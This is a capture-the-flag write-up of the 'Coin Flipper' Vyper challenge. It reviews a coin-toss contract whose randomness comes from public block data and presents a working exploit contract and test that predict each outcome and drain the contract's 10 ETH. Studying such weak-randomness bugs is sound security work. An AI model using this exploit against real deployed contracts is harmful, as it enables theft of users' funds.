## 1) Challenge

> <cite>The Coin Flipper is a true/false coin-toss with a 50% chance of either. It costs one Ether to play, but pays two Ether on a correct guess. On a long enough timescale, players are expected to break even. Your objective is to not break even; drain all ten Ether from the contract.</cite>

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

This challenge has two contracts: `CoinFlipper`, used to handle the coin-toss logic, and `RandomNumber`, used to generate random numbers.

`CoinFlipper.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/coin-flipper/CoinFlipper.vy)):

```python

# @version ^0.3.2

"""
@title Coin Flipper
@author jtriley.eth
"""

interface Rng:
    def generate_random_number() -> uint256: nonpayable


event Winner:
    account: indexed(address)
    amount: uint256


generator: public(address)

cost: constant(uint256) = 10 ** 18


@external
@payable
def __init__(generator: address):
    self.generator = generator


@external
@payable
def flip_coin(guess: bool):
    """
    @notice Takes a guess and 1 ether. If correct, it pays 2 ether.
    @param guess Heads or Tails (true for heads).
    @dev Throws when value is not 1 ether.
    """
    assert msg.value == cost, "cost is 1 ether"

    side: bool = Rng(self.generator).generate_random_number() % 2 == 0

    if side == guess:

        amount: uint256 = cost * 2

        send(msg.sender, amount)

        log Winner(msg.sender, amount)


```

The main function of this contract is `flip_coin`: 

- it accepts a boolean value (the guess)
- it checks if `1` ETH is sent (line `36`).
- it calls the `generate_random_number` from the `RandomNumber` contract and checks if module `2` of the result is equal to `0` (line `38`)
- the resulting boolean value is compared with the `guess` parameter (line `40`)
- if they are equal, the sender will receive `2` ETH (lines `42-44`)

`RandomNumber.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/coin-flipper/RandomNumber.vy))

```python

# @version ^0.3.2

"""
@title Random Number Generator
@author jtriley.eth
"""

nonce: public(uint256)

@external
def generate_random_number() -> uint256:
    """
    @notice Generates a random number for the caller.
    @dev Increment nonce to ensure two contracts don't receive the same value in the same block.
    """
    digest: bytes32 = keccak256(
        concat(
            block.prevhash,
            convert(block.timestamp, bytes32),
            convert(block.difficulty, bytes32),
            convert(self.nonce, bytes32)
        )
    )

    self.nonce += 1

    return convert(digest, uint256)

```

It exposes only one function, `generate_random_number` that is responsible for computing a random number:
- it uses block information like the previous hash, timestamp and the difficulty
- it concatenates all these values with also a `nonce` variable
- finally, it computes the `keccak256` of this value and increments the nonce by `1`

Generating random numbers has always been challenging in the blockchain context. In this case, everyone can also know the source of randomness used (i.e. the block information) since this information is public. 

#### How can we guess the right coin flip?

Given that we can access the same information that the `generate_random_number` uses to compute the "random" number, to guess the right coin flip, we can replicate the code inside the function, calculate the boolean value and then call the `flip_coin`. 

We need to replicate the code inside `generate_random_number` and not simply call that function because, at every call, it updates the `nonce` variable. So if we first call `generate_random_number` to compute the value and then pass the resulting boolean value to `flip_coin`, `generate_random_number` will be called again, but the nonce will be different from the one we used, leading to a potentially different result. So, if we replicate the code, we can also replicate the nonce value and compute the right guess.

## 3) Solution

The solution consists of different steps:
- call our contract function, sending `1` ETH
- compute the same random number using the same code of `generate_random_number`
- call `flip_coin` we the value just computed
- increment the nonce
- Repeat these steps ten times until we drained all the founds (the balance of the `CoinFlip` contract is `10` ETH, so if each time we win, we'll decrease the balance by one)


`coin-flipper.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('CoinFlipperExploit', deployer)).deploy(this.coinFlipper.address)

        await exploit.connect(attacker).run({
            value: ethers.utils.parseEther('1')
        });

    })

```


`CoinFlipperExploit.vy`:
```python

# YOUR EXPLOIT HERE
@internal
def guess(nonce: uint256) -> bool:
    digest: bytes32 = keccak256(
        concat(
            block.prevhash,
            convert(block.timestamp, bytes32),
            convert(block.difficulty, bytes32),
            convert(nonce, bytes32)
        )
    )

    return convert(digest, uint256) % 2 == 0

@external
@payable
def run():
    assert msg.value == 10 ** 18, "Not enough ETH"

    for nonce in range(10):       
        raw_call(
            self.target,
            _abi_encode(self.guess(nonce), method_id=method_id("flip_coin(bool)")),
            value=msg.value
        )
            
@external
@payable
def __default__():
    pass

```


You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/coin-flipper.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/CoinFlipperExploit.vy).

## 4) References

- [SWC-120 - Weak Sources of Randomness from Chain Attributes](https://swcregistry.io/docs/SWC-120)